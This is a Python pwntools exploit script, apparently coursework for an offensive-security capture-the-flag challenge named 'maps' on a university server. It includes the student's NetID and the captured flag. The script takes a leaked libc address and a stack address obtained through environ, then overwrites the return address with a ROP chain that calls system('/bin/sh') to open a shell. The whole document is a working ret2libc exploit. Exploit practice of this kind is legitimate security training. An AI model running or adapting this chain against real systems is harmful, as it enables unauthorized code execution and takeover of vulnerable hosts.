from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./maps"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1205
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

print(p.recvuntil(b": ").decode())
glibc_stdin_addr = u64(p.recv(8))
log.info(f"Receiving leaked stdin address: {hex(glibc_stdin_addr)}")

glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_stdin_addr - glibc_e.symbols._IO_2_1_stdin_
glibc_environ_addr = glibc_base_addr + glibc_e.symbols.environ

print(p.recvuntil(b"?\n").decode())
p.send(p64(glibc_environ_addr))
log.info(f"Sending environ address: {hex(glibc_environ_addr)}")

stack_addr = int(p.recvline().decode().strip(), 16)
log.info(f"Reveiving leaked stack address: {hex(stack_addr)}")

return_offset = 0x120
return_addr = stack_addr - return_offset
p.recvuntil(b"?\n")
p.send(p64(return_addr))
log.info(f"Sending return address: {hex(return_addr)}")

glibc_binsh_addr = glibc_base_addr + next(glibc_e.search(b"/bin/sh"))
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

glibc_r = ROP("libc.so.6")
chain = [
    glibc_r.rdi.address + glibc_base_addr,     # 1. Address of "pop rdi; ret" gadget in libc - calculated by adding gadget offset to libc base
    glibc_binsh_addr,                          # 2. Address of "/bin/sh" string in libc - this will be popped into rdi register
    glibc_r.ret.address + glibc_base_addr,     # 3. Address of ret instruction in libc - for stack alignment (adding base address to get actual location)
    glibc_system_addr                          # 4. Address of system() in libc - will be called with "/bin/sh" argument from rdi
]

msg = b"".join([p64(c) for c in chain])
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{th4t_w4s_s0m3_fun_r0pp1ng!_eb4d86a8d93b0934}
